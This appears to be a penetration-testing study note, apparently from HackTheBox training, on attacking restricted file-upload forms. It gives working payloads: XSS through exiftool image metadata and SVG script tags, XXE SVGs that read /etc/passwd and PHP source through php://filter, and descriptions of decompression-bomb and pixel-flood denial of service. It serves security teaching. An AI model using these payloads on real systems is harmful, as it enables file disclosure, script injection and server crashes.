# Limited File Uploads

Even if we deal with a limited file upload form, that allows us to upload specific file types, we can still be able to perform a number of attacks.

## XSS

Some file types allows us a `Stored XSS` vulnerability to the web app by uploading maliciously crafted versions of them.

For example `.html` files, even though it doesn;t allow us to execute code, it can be possible to implement JS code within them to carry an XSS or CSRF attack.

Another example of XSS is web apps that display an image's metadata after its upload, and we can include an XSS payload in one of the metadata parameters that accept raw text:

```sh
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
exiftool HTB.jpg
```

So when the metadata is displayed, the XSS payload should be triggered, and JS code executed.

If we can change the image MIME-type to `text/html` some web apps may show it as an HTML document instead of an image, the XSS payload is triggered even if the metadata wasn't directly displayed.

XSS attacks can be carred out with `svg` files as they are XML-based, which the browser renders into an image, and we can modify the XML data to include an XSS payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

## XXE

SVG images can also include malicious XML data to leak the source code of the web app, or other internal documents:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

Read source code in PHP web apps:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

## DoS

These attacks can also lead to DoS attacks.

`Decompression Bomb` can be used with file types that use data compression, like `ZIP` archives, so if the web app automatically unzips a ZIP archive, it is possible to upload a malicious archive containing nested ZIP archives within it, which can lead to many Petabytes of data, resulting in a crash on the back-end.

`Pixel Flood` attack with some image files that have image comporession, such as `jpg` or `png`. The idea is that we can create a `jpg` file with some image size for example `500x500` and then manually modify its compression data to `0xffff x 0xffff`, which results in an image with a size of 4 Gigapixels. 

When the web app attemts to display the image, it attempts to allocate all of its memory to this image - crash on the back-end server.

